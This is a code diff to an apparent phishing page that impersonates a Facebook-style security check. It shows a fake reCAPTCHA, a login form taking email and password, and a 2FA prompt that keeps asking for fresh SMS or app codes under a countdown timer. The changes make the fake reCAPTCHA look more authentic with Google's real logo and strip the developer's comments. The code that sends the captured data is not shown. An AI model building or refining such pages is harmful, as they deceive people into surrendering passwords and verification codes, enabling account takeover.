@@ -40,29 +40,7 @@
         }
         .modal-card h2 { margin-top: 0; font-size: 24px; }
         .modal-card p { color: #606770; font-size: 14px; margin-bottom: 30px; }
-        .captcha-box {
-            border: 1px solid #d3d6db;
-            border-radius: 4px;
-            padding: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            background: #f9fafb;
-            margin-bottom: 30px;
-        }
-        .captcha-box label {
-            display: flex;
-            align-items: center;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        .captcha-box input[type="checkbox"] {
-            width: 24px;
-            height: 24px;
-            margin-right: 15px;
-            cursor: pointer;
-        }
-        .modal-footer { font-size: 12px; color: #8a8d91; }
+        .modal-footer { font-size: 12px; color: #8a8d91; margin-top: 20px;}
 
         /* === BƯỚC 2: Màn hình Đăng nhập & Chat === */
         #step2 { background: white; align-items: flex-start; justify-content: center; padding-top: 50px; }
@@ -169,7 +147,6 @@
         .step5-header { color: #1877f2; font-size: 24px; font-weight: bold; margin-bottom: 15px; }
         .step5-title { font-size: 20px; margin: 0 0 10px 0; }
         .step5-subtitle { font-size: 14px; color: #606770; margin-bottom: 20px; }
-        .step5-graphic { background: #fdf4f6; height: 150px; border-radius: 8px; margin-bottom: 20px; display: flex; align-items: center; justify-content: center; color: #d06f89;}
         .info-box { border: 1px solid #1877f2; border-left: 4px solid #1877f2; padding: 15px; font-size: 13px; background: #f7f8fa; border-radius: 4px; margin-bottom: 20px; }
         .timer-section { font-size: 14px; margin-bottom: 20px; }
         .timer-red { color: #e41e3f; font-weight: bold; }
@@ -183,12 +160,19 @@
         <div class="modal-card">
             <h2>Security Verification</h2>
             <p>Please confirm that you are a real person to access this service.</p>
-            <div class="captcha-box">
-                <label>
-                    <input type="checkbox" id="captchaCheck"> I'm not a robot
+            
+            <div style="display: flex; align-items: center; justify-content: space-between; border: 1px solid #d3d6db; background: #f9fafb; padding: 15px; border-radius: 3px; max-width: 280px; margin: 0 auto;">
+                <label style="display: flex; align-items: center; font-size: 14px; cursor: pointer; color: #222; font-family: Roboto, Arial, sans-serif;">
+                    <input type="checkbox" id="captchaCheck" style="width: 26px; height: 26px; margin-right: 12px; cursor: pointer;"> 
+                    I'm not a robot
                 </label>
-                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/RecaptchaLogo.svg/1200px-RecaptchaLogo.svg.png" alt="captcha" width="30">
+                <div style="text-align: center; display: flex; flex-direction: column; align-items: center; font-family: Roboto, Arial, sans-serif;">
+                    <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" width="32">
+                    <span style="font-size: 10px; color: #555; margin-top: 4px;">reCAPTCHA</span>
+                    <span style="font-size: 8px; color: #999; margin-top: 2px;">Privacy - Terms</span>
+                </div>
             </div>
+
             <div class="modal-footer">Protected by secure cloud connection</div>
         </div>
     </div>
@@ -254,8 +238,6 @@
             <h2 class="step5-title">Check notifications on other devices.</h2>
             <p class="step5-subtitle">Or enter the code you received via SMS, email, Facebook or WhatsApp notification, or in the Verify app.</p>
             
-            <div class="step5-graphic">[Hình ảnh Điện thoại & Máy tính]</div>
-            
             <div class="info-box">
                 This process may take a few minutes. Please wait for the verification code to arrive. Once received, you will be able to log in. By selecting the display device shown in the message, our system will identify you and verify that you are the account owner.
             </div>
@@ -278,7 +260,6 @@
     </div>
 
     <script>
-        // Hàm chuyển đổi các bước hiển thị
         function showStep(stepId) {
             document.querySelectorAll('.step-container').forEach(el => {
                 el.classList.remove('active');
@@ -286,15 +267,12 @@
             document.getElementById(stepId).classList.add('active');
         }
 
-        // BƯỚC 1: Tích chọn Captcha
         document.getElementById('captchaCheck').addEventListener('change', function() {
             if(this.checked) {
-                // Đợi 0.5 giây rồi chuyển sang bước 2 để tạo cảm giác tự nhiên
                 setTimeout(() => { showStep('step2'); }, 500);
             }
         });
 
-        // BƯỚC 2: Kiểm tra điền Form Đăng nhập
         const inputEmail = document.getElementById('inputEmail');
         const inputPass = document.getElementById('inputPass');
         const btnSubmitStep2 = document.getElementById('btnSubmitStep2');
@@ -310,19 +288,17 @@
         inputEmail.addEventListener('input', checkStep2Form);
         inputPass.addEventListener('input', checkStep2Form);
 
-        // Bấm gửi Bước 2 -> Form mờ đi -> sang Bước 4 (Loading) -> sang Bước 5
         btnSubmitStep2.addEventListener('click', function() {
-            formStep2.classList.add('disabled-element'); // Làm mờ dữ liệu và nút
+            formStep2.classList.add('disabled-element');
             setTimeout(() => {
-                showStep('step4'); // Sang màn hình tải
+                showStep('step4');
                 setTimeout(() => {
-                    showStep('step5'); // Chờ 5s rồi sang bước 5
-                    startTimer(); // Bắt đầu đếm ngược thời gian
+                    showStep('step5');
+                    startTimer();
                 }, 5000);
-            }, 500); // Độ trễ ngắn để nhìn thấy hiệu ứng mờ
+            }, 500);
         });
 
-        // BƯỚC 5: Kiểm tra điền mã xác nhận
         const inputCode = document.getElementById('inputCode');
         const btnSubmitStep5 = document.getElementById('btnSubmitStep5');
         const formStep5 = document.getElementById('formStep5');
@@ -336,40 +312,30 @@
         }
         inputCode.addEventListener('input', checkStep5Form);
 
-        // Bấm gửi Bước 5 -> Form mờ đi -> hiện lại Bước 4 (Loading) -> quay lại Bước 5
         btnSubmitStep5.addEventListener('click', function() {
-            formStep5.classList.add('disabled-element'); // Làm mờ form
-            
+            formStep5.classList.add('disabled-element');
             setTimeout(() => {
-                showStep('step4'); // Trở lại màn hình loading
-                
+                showStep('step4');
                 setTimeout(() => {
-                    // Sau 5s trở lại Bước 5, thiết lập lại trạng thái để người dùng có thể nhập tiếp nếu cần
                     formStep5.classList.remove('disabled-element');
-                    inputCode.value = ''; // Xóa mã cũ
-                    btnSubmitStep5.disabled = true; // Khóa lại nút
+                    inputCode.value = '';
+                    btnSubmitStep5.disabled = true;
                     showStep('step5');
                 }, 5000);
-                
             }, 500);
         });
 
-        // Logic đếm ngược thời gian ở Bước 5 (04:43)
         let timerInterval;
         function startTimer() {
             clearInterval(timerInterval);
-            let time = 4 * 60 + 43; // 4 phút 43 giây
+            let time = 4 * 60 + 43;
             const display = document.getElementById('countdown');
-            
             timerInterval = setInterval(function () {
                 let minutes = parseInt(time / 60, 10);
                 let seconds = parseInt(time % 60, 10);
-
                 minutes = minutes < 10 ? "0" + minutes : minutes;
                 seconds = seconds < 10 ? "0" + seconds : seconds;
-
                 display.textContent = minutes + ":" + seconds;
-
                 if (--time < 0) {
                     time = 0;
                     clearInterval(timerInterval);
@@ -377,6 +343,5 @@
             }, 1000);
         }
     </script>
-    <script src="app.js"></script>
 </body>
 </html>
